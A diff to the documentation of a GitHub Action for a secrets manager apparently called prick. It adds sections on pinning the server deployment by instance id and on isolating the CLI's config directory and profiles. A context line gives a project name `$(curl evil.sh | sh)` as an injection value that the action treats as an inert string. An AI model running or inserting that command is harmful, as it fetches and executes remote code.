@@ -127,6 +127,16 @@ variable:
     token: ${{ fromJSON(steps.prick.outputs.secrets).SOME_TOKEN }}
 ```
 
+**Pinning the deployment.** Every prick deployment has a permanent instance id, which `prk whoami`
+prints. Set `PRK_EXPECT_INSTANCE` in the workflow and the CLI refuses to read from any server whose
+instance id differs, so a `url` pointed at the wrong deployment fails the step instead of injecting
+that deployment's secrets. The action passes the variable through unchanged.
+
+```yaml
+env:
+  PRK_EXPECT_INSTANCE: 0123456789abcdef0123456789abcdef
+```
+
 Prefer `export-to: env` where you can. An output travels through more of the runner's machinery than
 an environment variable does, and it is easier to print by accident.
 
@@ -204,6 +214,14 @@ answer.
 a project named `$(curl evil.sh | sh)` is a string. The CLI is spawned with a fixed argument vector,
 and the URL, project, environment and token are handed to it through the environment — which also
 keeps the token out of `ps` output on the runner.
+
+**The server is the `url` input and nothing else.** The action runs `prk` with a config directory
+of its own (`PRK_CONFIG_DIR`, a fresh empty directory under `RUNNER_TEMP` created for each run) and
+with `PRK_PROFILE` set to the empty string. Profiles, stored credentials and a default profile on a
+self-hosted runner never apply to the job, a `.prick.toml` in the checkout has no profile to select,
+and a workflow-level `PRK_PROFILE` does not collide with the URL the action sets. A `.prick.toml`
+still applies its `[[allow]]` list: the CLI refuses a `url` whose deployment the repository does not
+list, so the file can make a run stricter and never points it anywhere.
 
 **No error message can contain a value.** Error text names _keys_, which are stored in plaintext by
 design and are therefore safe to echo. The one non-obvious case: when the CLI's output will not
